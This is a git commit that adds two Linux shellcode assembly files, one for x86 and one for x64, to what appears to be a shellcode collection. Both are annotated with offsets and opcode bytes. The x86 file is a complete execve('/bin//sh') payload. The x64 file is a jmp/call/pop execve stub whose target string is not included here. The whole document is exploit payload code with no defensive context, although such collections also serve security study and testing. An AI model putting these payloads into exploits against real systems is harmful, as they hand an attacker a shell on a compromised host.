8564b19a636606da191d50d51c3a9bbad072571d
mr6r4y <mr6r4y@gmail.com>
2017-12-11 07:51:28 +0200

    Add

---
+++ shellcodes/linux/x64/binsh_1.asm
@@ -0,0 +1,12 @@
+.arch x86
+.bits 64
+
+jmp 0xd         ; 0x00000000   2          eb0b
+pop rdi         ; 0x00000002   1            5f
+xor rdx, rdx    ; 0x00000003   3        4831d2
+push rdx        ; 0x00000006   1            52
+pop rsi         ; 0x00000007   1            5e
+push 0x3b       ; 0x00000008   2          6a3b  ; __NR_execve
+pop rax         ; 0x0000000a   1            58
+syscall         ; 0x0000000b   2          0f05
+call 2          ; 0x0000000d   5    e8f0ffffff
---
+++ shellcodes/linux/x86/binsh_1.asm
@@ -0,0 +1,14 @@
+.arch x86
+.bits 32
+
+xor eax, eax            ; 0x00000000   2           31c0
+cdq                     ; 0x00000002   1             99
+push eax                ; 0x00000003   1             50
+push 0x68732f2f         ; 0x00000004   5     682f2f7368  ; //sh
+push 0x6e69622f         ; 0x00000009   5     682f62696e  ; /bin
+mov ebx, esp            ; 0x0000000e   2           89e3
+push eax                ; 0x00000010   1             50
+push ebx                ; 0x00000011   1             53
+mov ecx, esp            ; 0x00000012   2           89e1
+mov al, 0xb             ; 0x00000014   2           b00b  ; __NR_execve
+int 0x80                ; 0x00000016   2           cd80
